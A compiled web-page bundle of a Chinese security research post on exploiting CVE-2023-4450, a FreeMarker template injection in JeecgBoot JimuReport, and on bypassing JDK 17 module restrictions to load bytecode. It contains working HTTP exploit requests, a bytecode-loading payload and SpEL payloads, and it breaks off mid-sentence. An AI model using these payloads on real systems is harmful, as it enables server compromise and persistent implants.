"use strict";(self.webpackChunkwhoopsunix_wiki=self.webpackChunkwhoopsunix_wiki||[]).push([[1131],{71575:(A,e,a)=>{a.r(e),a.d(e,{assets:()=>t,contentTitle:()=>d,default:()=>i,frontMatter:()=>l,metadata:()=>c,toc:()=>o});var s=a(85893),n=a(11151);const l={sidebar_position:1,tags:["Java","JDK17","SPEL","FreeMarker","CVE"]},d="JDK 17+ FreeMarker SSTI\uff1a\u4ece CVE-2023-4450 \u590d\u73b0\u5f15\u51fa MethodHandle \u53e5\u67c4\u3001named module \u673a\u5236\u7814\u7a76",c={id:"java/named module/named module",title:"JDK 17+ FreeMarker SSTI\uff1a\u4ece CVE-2023-4450 \u590d\u73b0\u5f15\u51fa MethodHandle \u53e5\u67c4\u3001named module \u673a\u5236\u7814\u7a76",description:"\u79ef\u6728\u62a5\u8868\u8fd9\u4e2a\u6d1e\u5df2\u7ecf\u516c\u5f00\u5f88\u4e45\u4e86\uff0c\u5c31\u662f\u4e00\u4e2a FreeMarker SSTI \uff0c\u4e4b\u524d\u590d\u73b0\u7684\u65f6\u5019\u7528\u4e86 1.6.0 \u7248\u672c\u6d4b\u8bd5\u53ef\u4ee5\u6267\u884c\u547d\u4ee4 \u4e5f\u53ef\u4ee5\u6253\u5185\u5b58\u9a6c\u5c31\u628a\u6ca1\u7ee7\u7eed\u7ba1\u4e86\uff0c\u6700\u8fd1\u542c\u5230\u4e0d\u5c11\u5173\u4e8e\u8fd9\u4e2a\u6d1e\u7684\u8ba8\u8bba\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u8fd9\u4e2a payload \u6267\u884c\u547d\u4ee4\uff0c\u4f46\u662f\u4e0d\u80fd\u6ce8\u5165\u5185\u5b58\u9a6c\uff0c\u6240\u4ee5\u51b3\u5b9a\u518d\u6765\u91cd\u65b0\u8ddf\u4e00\u4e0b\u8fd9\u4e2a\u6d1e\uff0c\u6ca1\u60f3\u5230\u6536\u83b7\u9887\u4e30\u3002",source:"@site/docs/02-java/named module/named module.md",sourceDirName:"02-java/named module",slug:"/java/named module/",permalink:"/docs/java/named module/",draft:!1,unlisted:!1,editUrl:"https://github.com/Whoopsunix/whoopsunix.github.io/docs/02-java/named module/named module.md",tags:[{label:"Java",permalink:"/docs/tags/java"},{label:"JDK17",permalink:"/docs/tags/jdk-17"},{label:"SPEL",permalink:"/docs/tags/spel"},{label:"FreeMarker",permalink:"/docs/tags/free-marker"},{label:"CVE",permalink:"/docs/tags/cve"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["Java","JDK17","SPEL","FreeMarker","CVE"]},sidebar:"tutorialSidebar",previous:{title:"SAST \u4e4b\u8def - joern \u5165\u95e8\u7bc7 (\u4e00)",permalink:"/docs/java/SAST/joern/"},next:{title:"RASP \u7ed5\u8fc7 Trick",permalink:"/docs/java/RASP/RASPBypass"}},t={},o=[{value:"0x01 \u5bfb\u627e\u53ef\u7528\u7684 payload json \u683c\u5f0f",id:"0x01-\u5bfb\u627e\u53ef\u7528\u7684-payload-json-\u683c\u5f0f",level:2},{value:"0x02 JDK \u9ad8\u7248\u672c\u4e0b\u7684 SPEL \u6ce8\u5165 (MethodHandle)",id:"0x02-jdk-\u9ad8\u7248\u672c\u4e0b\u7684-spel-\u6ce8\u5165-methodhandle",level:2},{value:"\u8865\u5145",id:"\u8865\u5145",level:3},{value:"0x03 Unsafe \u7ed5\u8fc7 JDK 17 \u53cd\u5c04\u9650\u5236 (named module)",id:"0x03-unsafe-\u7ed5\u8fc7-jdk-17-\u53cd\u5c04\u9650\u5236-named-module",level:2}];function r(A){const e={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,n.a)(),...A.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(e.h1,{id:"jdk-17-freemarker-ssti\u4ece-cve-2023-4450-\u590d\u73b0\u5f15\u51fa-methodhandle-\u53e5\u67c4named-module-\u673a\u5236\u7814\u7a76",children:"JDK 17+ FreeMarker SSTI\uff1a\u4ece CVE-2023-4450 \u590d\u73b0\u5f15\u51fa MethodHandle \u53e5\u67c4\u3001named module \u673a\u5236\u7814\u7a76"}),"\n",(0,s.jsx)(e.p,{children:"\u79ef\u6728\u62a5\u8868\u8fd9\u4e2a\u6d1e\u5df2\u7ecf\u516c\u5f00\u5f88\u4e45\u4e86\uff0c\u5c31\u662f\u4e00\u4e2a FreeMarker SSTI \uff0c\u4e4b\u524d\u590d\u73b0\u7684\u65f6\u5019\u7528\u4e86 1.6.0 \u7248\u672c\u6d4b\u8bd5\u53ef\u4ee5\u6267\u884c\u547d\u4ee4 \u4e5f\u53ef\u4ee5\u6253\u5185\u5b58\u9a6c\u5c31\u628a\u6ca1\u7ee7\u7eed\u7ba1\u4e86\uff0c\u6700\u8fd1\u542c\u5230\u4e0d\u5c11\u5173\u4e8e\u8fd9\u4e2a\u6d1e\u7684\u8ba8\u8bba\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u8fd9\u4e2a payload \u6267\u884c\u547d\u4ee4\uff0c\u4f46\u662f\u4e0d\u80fd\u6ce8\u5165\u5185\u5b58\u9a6c\uff0c\u6240\u4ee5\u51b3\u5b9a\u518d\u6765\u91cd\u65b0\u8ddf\u4e00\u4e0b\u8fd9\u4e2a\u6d1e\uff0c\u6ca1\u60f3\u5230\u6536\u83b7\u9887\u4e30\u3002"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-http",children:'POST /jmreport/queryFieldBySql HTTP/1.1\nHost: \nAccept: application/json, text/plain, */*\nContent-Type: application/json\n\n{"sql":"select \'result:<#assign ex=\\"freemarker.template.utility.Execute\\"?new()> ${ex(\\"id\\") }\'" }\n'})}),"\n",(0,s.jsx)(e.h2,{id:"0x01-\u5bfb\u627e\u53ef\u7528\u7684-payload-json-\u683c\u5f0f",children:"0x01 \u5bfb\u627e\u53ef\u7528\u7684 payload json \u683c\u5f0f"}),"\n",(0,s.jsxs)(e.p,{children:["\u76f4\u63a5\u6253 freeMarker \u7684 payload\uff0c\u4f1a\u5728 ",(0,s.jsx)(e.code,{children:"org.jeecg.modules.jmreport.desreport.util.f#a()"})," \u8fd9\u4e2a\u65b9\u6cd5\u9047\u5230\u6b63\u5219\u56de\u6eaf\u7684\u95ee\u9898\uff0c\u641c\u4e86\u4e00\u4e0b\u770b\u5230 ",(0,s.jsx)(e.a,{href:"https://mp.weixin.qq.com/s/D25erS2sUccAtX14GOD_yQ",children:"\u6280\u672f\u7814\u7a76|Jeecg-Boot SSTI \u6f0f\u6d1e\u5229\u7528\u7814\u7a76"})," \u8fd9\u7bc7\u6587\u7ae0\u7ed9\u51fa\u4e86\u4e0b\u9762\u8fd9\u4e2a payload \u7528 script \u52a0\u8f7d"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240502021123023",src:a(56818).Z+"",width:"1496",height:"360"})}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-http",children:'POST /jmreport/queryFieldBySql HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: application/json, text/plain, */*\nContent-Type: application/json\nJWfzTzb: hostname\n\n{\n"sql":"call${\\"freemarker.template.utility.ObjectConstructor\\"?new()(\\"javax.script.ScriptEngineManager\\").getEngineByName(\\"js\\").eval(\'data=\\"yv66v....\\";bytes=\\"\\".getBytes();try{bytes=java.util.Base64.getDecoder().decode(data);}catch(e){aClass=java.lang.Class.forName(\\"sun.misc.BASE64Decoder\\");object=aClass.newInstance();bytes=aClass.getMethod(\\"decodeBuffer\\",java.lang.String.class).invoke(object,data);}classLoader=java.lang.Thread.currentThread().getContextClassLoader();try{clazz=classLoader.loadClass(\\"org.apache.util.readonlyiterator.collections.Wicket\\");clazz.newInstance();}catch(err){defineClassMethod=java.lang.Class.forName(\\"java.lang.ClassLoader\\").getDeclaredMethod(\\"defineClass\\",\\"\\".getBytes().getClass(),java.lang.Integer.TYPE,java.lang.Integer.TYPE);defineClassMethod.setAccessible(true);loadedClass=defineClassMethod.invoke(classLoader,bytes,0,bytes.length);loadedClass.newInstance();};#{1};\')}","dbSource":"","type":"0"}\n'})}),"\n",(0,s.jsx)(e.p,{children:"\u5b9e\u6d4b\u4e2d\u9047\u5230\u7684\u7b2c\u4e00\u4e2a\u662f 1.4.3 \u8fd9\u4e2a\u7248\u672c\uff0c\u4e0a\u8ff0 payload \u4f1a\u9047\u5230\u62a5\u9519\uff0c\u597d\u597d\u597d\u9ad8\u7248\u672c\u6ca1\u6709\u4f4e\u7248\u672c\u6709\u662f\u53ed\u3002"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240503231958181",src:a(56825).Z+"",width:"2368",height:"1180"})}),"\n",(0,s.jsxs)(e.p,{children:["\u8ddf\u8fdb\u4e00\u4e0b ",(0,s.jsx)(e.code,{children:"/queryFieldBySql"})," \u63a5\u53e3\uff0c\u8fd8\u6709\u4e00\u4e2a paramArray \u53c2\u6570"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240503232216065",src:a(63814).Z+"",width:"2336",height:"974"})}),"\n",(0,s.jsx)(e.p,{children:"\u6700\u7ec8\u53c2\u4e0e\u4e86\u89e3\u6790\uff0c\u4e5f\u4e0d\u7528\u53bb\u8003\u8651\u56de\u6eaf\u7684\u95ee\u9898"}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240503232306448",src:a(24370).Z+"",width:"2472",height:"866"})}),"\n",(0,s.jsx)(e.p,{children:"\u6240\u4ee5\u6700\u7ec8\u5f62\u6210\u5982\u4e0b payload"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:'{"sql": "select \'${x}\'", "dbSource": "", "type": "0", "paramArray": "[{\\"paramName\\": \\"x\\", \\"paramTxt\\": \\"\\", \\"orderNum\\": 1, \\"tableIndex\\": 1, \\"id\\": \\"\\", \\"paramValue\\": \\"  freemarker payload......  \\", \\"extJson\\": \\"\\", \\"_index\\": 0, \\"_rowKey\\": \\"105\\"}]"}\n'})}),"\n",(0,s.jsx)(e.h2,{id:"0x02-jdk-\u9ad8\u7248\u672c\u4e0b\u7684-spel-\u6ce8\u5165-methodhandle",children:"0x02 JDK \u9ad8\u7248\u672c\u4e0b\u7684 SPEL \u6ce8\u5165 (MethodHandle)"}),"\n",(0,s.jsx)(e.p,{children:"\u5728\u89e3\u51b3\u4e86\u4e0a\u9762\u7684\u95ee\u9898\u540e\u672c\u4ee5\u4e3a\u8fd9\u4e2a\u6f0f\u6d1e\u53ef\u4ee5\u7ed3\u675f\u4e86\uff0c\u53c8\u9047\u5230\u4e86\u53e6\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u73af\u5883\uff0c\u4e00\u6837\u662f\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u4f46\u662f\u4e0d\u80fd\u52a0\u8f7d\u5b57\u8282\u7801\uff0c\u5728\u539f\u5730\u8f6c\u5708\u5f88\u4e45\u540e\u7ec8\u4e8e\u60f3\u8d77\u6765\u770b\u4e00\u4e0b\u76ee\u6807\u73af\u5883\u7684\u7cfb\u7edf\u53d8\u91cf\uff0c\u662f\u4e00\u4e2a JDK 18 \uff0c\u9ad8\u7248\u672c\u7684\u5229\u7528\u6587\u7ae0\u5f88\u5c11\uff0c\u6240\u4ee5\u8bb0\u5f55\u4e00\u4e0b\u3002"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-http",children:'POST /jmreport/queryFieldBySql HTTP/1.1\nHost: \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: application/json, text/plain, */*\nContent-Type: application/json\n\n{"sql": "select \'${x}\'", "dbSource": "", "type": "0", "paramArray": "[{\\"paramName\\": \\"x\\", \\"paramTxt\\": \\"\\", \\"orderNum\\": 1, \\"tableIndex\\": 1, \\"id\\": \\"\\", \\"paramValue\\": \\"${\\\\\\"freemarker.template.utility.ObjectConstructor\\\\\\"?new()(\\\\\\"org.springframework.expression.spel.standard.SpelExpressionParser\\\\\\").parseExpression(\\\\\\"{T(java.lang.System).getProperty(\'java.version\')}\\\\\\").getValue()}\\", \\"extJson\\": \\"\\", \\"_index\\": 0, \\"_rowKey\\": \\"105\\"}]"}\n'})}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240503231032097",src:a(48269).Z+"",width:"1558",height:"622"})}),"\n",(0,s.jsxs)(e.p,{children:["SPEL \u52a0\u8f7d\u5b57\u8282\u7801\u7528\u5230\u4e86 ",(0,s.jsx)(e.code,{children:"org.springframework.cglib.core.ReflectUtils"})," \u8fd9\u4e2a\u7c7b\uff0c\u8fd9\u4e2a\u7c7b\u4f4d\u4e8e ",(0,s.jsx)(e.code,{children:"spring-core"})," \u6a21\u5757\u4e2d\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e9b\u5b9e\u7528\u65b9\u6cd5\uff0c\u7528\u4e8e\u53cd\u5c04\u64cd\u4f5c\u548c\u7c7b\u52a0\u8f7d\u7b49\u529f\u80fd\uff0c\u6bd4\u5982\u4ee5\u4e0b\u4ee3\u7801\u5c06\u6267\u884c ",(0,s.jsx)(e.code,{children:"open -a Calculator.app"})]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.example.Exec',T(java.util.Base64).getDecoder().decode('yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxvcmcvZXhhbXBsZS9FeGVjOwEADVN0YWNrTWFwVGFibGUHACUHACMBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAwADQcAJwwAKAApAQAERXhlYwcAKgwAKwAsBwAtDAAuAC8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAwADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQALc3RhdGljIEV4ZWMBABBvcmcvZXhhbXBsZS9FeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAAAAAAIAAQAMAA0AAQAOAAAAdgACAAIAAAAaKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAETLEAAQAEABUAGAAIAAMADwAAABoABgAAAAcABAAJAAwACgAVAAwAGAALABkADQAQAAAADAABAAAAGgARABIAAAATAAAAEAAC/wAYAAEHABQAAQcAFQAACAAWAA0AAQAOAAAAWwACAAEAAAAWsgACEgm2AAS4AAUSBrYAB1enAARLsQABAAAAEQAUAAgAAwAPAAAAFgAFAAAAEQAIABIAEQAUABQAEwAVABUAEAAAAAIAAAATAAAABwACVAcAFQAAAQAXAAAAAgAY'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader()))}\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u7528\u548c\u73af\u5883\u4e00\u81f4\u7684 JDK \u672c\u5730\u6d4b\u8bd5\u4f1a\u629b\u51fa ",(0,s.jsx)(e.code,{children:"InaccessibleObjectException"})," \u5f02\u5e38\uff0c\u8fd9\u4e2a\u5f02\u5e38\u8868\u660e\u8bd5\u56fe\u8c03\u7528 ",(0,s.jsx)(e.code,{children:"java.lang.ClassLoader.defineClass()"})," \u65b9\u6cd5\uff0c\u5728 JDK 9 \u4e4b\u540e\u7684\u7248\u672c\u5f15\u5165\u4e86 ",(0,s.jsx)(e.a,{href:"https://openjdk.org/jeps/200",children:"named module \u673a\u5236"}),"\uff0c\u5c06 ",(0,s.jsx)(e.code,{children:"java.*"})," \u4e0b\u975epublic\u53d8\u91cf\u548c\u65b9\u6cd5\u58f0\u660e\u4e3a\u53d7\u4fdd\u62a4\u7684\uff0c\u56e0\u6b64\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u3002\u8fd9\u4e2a\u9650\u5236\u5728 JDK 17 \u5f3a\u5236\u5f00\u542f\u3002"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-sh",children:'Caused by: java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain) throws java.lang.ClassFormatError accessible: module java.base does not "opens java.lang" to unnamed module @4501b7af\n\tat java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)\n\tat java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)\n\tat java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:199)\n\tat java.base/java.lang.reflect.Method.setAccessible(Method.java:193)\n\tat org.springframework.cglib.core.ReflectUtils.defineClass(ReflectUtils.java:552)\n\t... 16 more\n'})}),"\n",(0,s.jsx)(e.p,{children:"\u5b98\u65b9\u63d0\u4f9b\u901a\u8fc7\u542f\u52a8\u53c2\u6570\u5141\u8bb8\u5bf9\u4fdd\u62a4\u65b9\u6cd5\u7684\u8bbf\u95ee\u3002"}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-sh",children:"--add-opens java.base/java.lang=ALL-UNNAMED\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u5173\u4e8e\u6539\u673a\u5236\u7684\u8ba8\u8bba\u5148\u653e\u653e\uff0c\u6211\u4eec\u5148\u6765\u770b\u4e00\u4e0b\u9ad8\u7248\u672c ",(0,s.jsx)(e.code,{children:"ReflectUtils.defineClass()"})," \u65b9\u6cd5\u5728\u54ea\u4e00\u6b65\u62a5\u9519\u4e86\u3002"]}),"\n",(0,s.jsxs)(e.p,{children:["\u5728\u6267\u884c ",(0,s.jsx)(e.code,{children:"classLoaderDefineClassMethod.setAccessible(true);"})," \u65f6\uff0c\u56e0\u4e3a ",(0,s.jsx)(e.code,{children:"ClassLoader.definessClass()"})," \u662f\u4e00\u4e2a\u4fdd\u62a4\u65b9\u6cd5\u6240\u4ee5\u65e0\u6cd5\u7ee7\u7eed\u6267\u884c"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240502111353936",src:a(423).Z+"",width:"2296",height:"1340"})}),"\n",(0,s.jsxs)(e.p,{children:["\u56de\u770b\u5230 ",(0,s.jsx)(e.code,{children:"ReflectUtils.defineClass()"})," \u51fd\u6570\u5f00\u59cb\u65f6\u6709\u8fd9\u4e48\u4e00\u6bb5\u63cf\u8ff0 ",(0,s.jsx)(e.code,{children:"Preferred option: JDK 9+ Lookup.defineClass API if ClassLoader matches"}),", \u5728\u8fd9\u4e2a\u6267\u884c\u4e2d\u76f4\u63a5\u901a\u8fc7 ",(0,s.jsx)(e.code,{children:"c = (Class) lookupDefineClassMethod.invoke(lookup, b);"})," \u6765\u521b\u5efa Class \uff0c\u5e76\u4e14 ",(0,s.jsx)(e.code,{children:"privateLookupInMethod"})," \u548c ",(0,s.jsx)(e.code,{children:"lookupDefineClassMethod"})," \u5728 static \u65b9\u6cd5\u4e2d\u5df2\u7ecf\u88ab\u8d4b\u503c\u4e86\uff0c",(0,s.jsx)(e.code,{children:"contextClass"})," \u4e5f\u662f\u53ef\u63a7\u7684\uff0c\u90a3\u4e48\u5b9e\u9645\u4e0a\u53ea\u8981\u6ee1\u8db3 ",(0,s.jsx)(e.code,{children:"contextClass != null && contextClass.getClassLoader() == loader"})," \u8fd9\u4e2a\u6761\u4ef6\u5c31\u80fd\u5b9e\u73b0\u6211\u4eec\u7684\u9700\u6c42\u3002"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240502111908506",src:a(36915).Z+"",width:"1762",height:"842"})}),"\n",(0,s.jsxs)(e.p,{children:[(0,s.jsx)(e.code,{children:"java.lang.invoke.MethodHandles.Lookup"})," \u4e0e JNDI \u7684 lookup \u662f\u4e24\u4e2a\u6982\u5ff5\u4e0d\u8981\u6df7\u6dc6\uff0c\u662f\u4ec0\u4e48\u5462\uff1f ",(0,s.jsx)(e.a,{href:"https://docs.oracle.com/javase%2F7%2Fdocs%2Fapi%2F%2F/java/lang/invoke/MethodHandle.html",children:"\u5b98\u65b9\u6587\u6863"})," \u4e2d\u8fd9\u6837\u63cf\u8ff0 ",(0,s.jsx)(e.code,{children:"A method handle is a typed, directly executable reference to an underlying method, constructor, field, or similar low-level operation, with optional transformations of arguments or return values."})," \u7b80\u5355\u6765\u8bf4\uff0c\u5728 JDK 6 \u4ee5\u524d\u901a\u5e38\u662f\u901a\u8fc7\u53cd\u5c04\u5b9e\u73b0\u52a8\u6001\u8c03\u7528\uff0cJDK7 \u8fd9\u4e2a\u53e5\u67c4\u7684\u6982\u5ff5\u66f4\u50cf\u662f\u65b9\u6cd5\u7684\u6307\u9488\u3002\u901a\u8fc7\u547d\u4ee4\u6267\u884c\u5bf9\u6bd4\u5982\u4e0b\uff1a"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{className:"language-java",children:'    public static void original(String cmd) throws Exception {\n        Class<?> cls = Class.forName("java.lang.Runtime");\n        Object runtime = cls.getMethod("getRuntime").invoke(null);\n        cls.getMethod("exec", String.class).invoke(runtime, cmd);\n    }\n\n    public static void methodHandles(String cmd) throws Throwable {\n        Class<?> cls = Class.forName("java.lang.Runtime");\n        MethodHandle execMethod = MethodHandles.lookup().findVirtual(cls, "exec", MethodType.methodType(Process.class, String.class));\n        execMethod.invoke(cls.getMethod("getRuntime").invoke(null), cmd);\n    }\n'})}),"\n",(0,s.jsxs)(e.p,{children:[(0,s.jsx)(e.code,{children:"MethodHandles"})," \u4e5f\u662f\u63d0\u4f9b\u4e86\u6267\u884c\u4fdd\u62a4\u64cd\u4f5c\u7684\u65b9\u6cd5\uff0c\u666e\u901a\u7684 ",(0,s.jsx)(e.code,{children:"MethodHandles.lookup()"})," \u65e0\u6cd5\u8bbf\u95ee\u7279\u5b9a\u7684\u7c7b\u7684 private \u65b9\u6cd5\u6216\u5b57\u6bb5\u3002\u800c ",(0,s.jsx)(e.code,{children:"privateLookupIn"})," \u65b9\u6cd5\u5219\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e9b\u9650\u5236"]}),"\n",(0,s.jsxs)(e.p,{children:["\u56de\u8fc7\u5934\u6765\u770b\u4e00\u4e0b\u4e00\u822c\u7684 Payload \u4e2d\u7684 ",(0,s.jsx)(e.code,{children:"javax.management.loading.MLet"})," \u8fd9\u4e2a\u7c7b\uff0c\u7ee7\u627f\u4e86 ",(0,s.jsx)(e.code,{children:"java.net.URLClassLoader"})]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240502123601472",src:a(20122).Z+"",width:"1194",height:"268"})}),"\n",(0,s.jsxs)(e.p,{children:["\u6784\u9020\u65b9\u6cd5\u4e2d\u4f20\u5165\u7684 ClassLoader \u8fd8\u662f\u901a\u8fc7 ",(0,s.jsx)(e.code,{children:"URLClassLoader"})," \u6765\u5904\u7406\uff0c\u5bf9 ",(0,s.jsx)(e.code,{children:"URLClassLoader"})," \u6bd4\u8f83\u719f\u6089\u5c31\u4f1a\u77e5\u9053\u5728\u8fd9\u4e00\u6b65\u5b9e\u9645\u4e0a\u662f\u5c06\u53c2\u6570\u4f20\u9012\u7ed9\u7236\u7c7b\u52a0\u8f7d\u5668\u7528\u4e8e\u59d4\u6d3e\u52a0\u8f7d"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240502123726386",src:a(2242).Z+"",width:"1124",height:"182"})}),"\n",(0,s.jsxs)(e.p,{children:["\u8fd9\u5c31\u4f1a\u9020\u6210\u4e00\u4e2a\u95ee\u9898\uff0c\u5728 ",(0,s.jsx)(e.code,{children:"ReflectUtils.defineClass()"})," \u65b9\u6cd5\u53ef\u4ee5\u770b\u5230 ",(0,s.jsx)(e.code,{children:"MLet"})," \u8fd9\u4e2a loader \u4e2d\u6ca1\u6709\u53ef\u7528\u7684 class\uff0c\u90a3\u4e48\u4e3a\u4e86\u6ee1\u8db3 ",(0,s.jsx)(e.code,{children:"contextClass.getClassLoader() == loader"})," \u8fd9\u4e2a\u6761\u4ef6\uff0c\u7d22\u6027\u5c31\u653e\u5f03\u59d4\u6d3e\u52a0\u8f7d\uff0c\u5e72\u8106\u5c31\u76f4\u63a5\u7528 ",(0,s.jsx)(e.code,{children:"Thread.currentThread().getContextClassLoader()"})]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240502124116265",src:a(38310).Z+"",width:"1920",height:"1038"})}),"\n",(0,s.jsxs)(e.p,{children:["\u6309\u7167\u8fd9\u4e2a\u601d\u8def\uff0c",(0,s.jsx)(e.code,{children:"contextClass"})," \u9009\u62e9\u4e00\u4e2a ClassLoader \u4e2d\u6709\u7684\u5c31\u884c\uff0c\u65e2\u7136\u662f\u89e3\u6790 SPEL \u8868\u8fbe\u5f0f\u561b\u5c31\u968f\u4fbf\u9009\u4e00\u4e2a\u7c7b ",(0,s.jsx)(e.code,{children:"org.springframework.expression.ExpressionParser"})," \u6784\u5efa\u51fa\u8fd9\u4e2a\u8868\u8fbe\u5f0f"]}),"\n",(0,s.jsx)(e.pre,{children:(0,s.jsx)(e.code,{children:"{T(org.springframework.cglib.core.ReflectUtils).defineClass('org.example.Exec',T(java.util.Base64).getDecoder().decode('yv66vgAAADQAMgoACwAZCQAaABsIABwKAB0AHgoAHwAgCAAhCgAfACIHACMIACQHACUHACYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAEkxvcmcvZXhhbXBsZS9FeGVjOwEADVN0YWNrTWFwVGFibGUHACUHACMBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAlFeGVjLmphdmEMAAwADQcAJwwAKAApAQAERXhlYwcAKgwAKwAsBwAtDAAuAC8BABZvcGVuIC1hIENhbGN1bGF0b3IuYXBwDAAwADEBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQALc3RhdGljIEV4ZWMBABBvcmcvZXhhbXBsZS9FeGVjAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAKAAsAAAAAAAIAAQAMAA0AAQAOAAAAdgACAAIAAAAaKrcAAbIAAhIDtgAEuAAFEga2AAdXpwAETLEAAQAEABUAGAAIAAMADwAAABoABgAAAAcABAAJAAwACgAVAAwAGAALABkADQAQAAAADAABAAAAGgARABIAAAATAAAAEAAC/wAYAAEHABQAAQcAFQAACAAWAA0AAQAOAAAAWwACAAEAAAAWsgACEgm2AAS4AAUSBrYAB1enAARLsQABAAAAEQAUAAgAAwAPAAAAFgAFAAAAEQAIABIAEQAUABQAEwAVABUAEAAAAAIAAAATAAAABwACVAcAFQAAAQAXAAAAAgAY'),T(java.lang.Thread).currentThread().getContextClassLoader(), null, T(java.lang.Class).forName(\"org.springframework.expression.ExpressionParser\"))}\n"})}),"\n",(0,s.jsxs)(e.p,{children:["\u53ef\u4ee5\u770b\u5230\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38 ",(0,s.jsx)(e.code,{children:"org.example.Exec not in same package as lookup class"})]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240502130200048",src:a(15422).Z+"",width:"2188",height:"1080"})}),"\n",(0,s.jsxs)(e.p,{children:["\u539f\u56e0\u662f\u51fa\u5728 ",(0,s.jsx)(e.code,{children:"java.lang.invoke.MethodHandles.Lookup.ClassFile#newInstance()"})," \u8fd9\u4e2a\u65b9\u6cd5\u4e2d\uff0c\u6211\u4eec\u52a0\u8f7d\u7684\u5b57\u8282\u7801\u7c7b\u540d\u548c\u6784\u5efa\u65f6\u4f20\u5165\u7684 contextClass \u4e0d\u4e00\u81f4"]}),"\n",(0,s.jsx)(e.p,{children:(0,s.jsx)(e.img,{alt:"image-20240502130823359",src:a(4962).Z+"",width:"1988",height:"872"})}),"\n",(0,s.jsx)(e.p,{children:"\u89e3\u51b3\u529e\u6cd5\u4e5f\u5f88\u7b80\u5355\uff0c\u5b9a\u4e49\u4e00\u4e2a\u540c\u6837\u5305\u7684\u7c7b\u5c31\u884c\uff0c\u81f3\u6b64\u5b8c\u6210 JDK \u9ad8\u7248\u672c\u7684 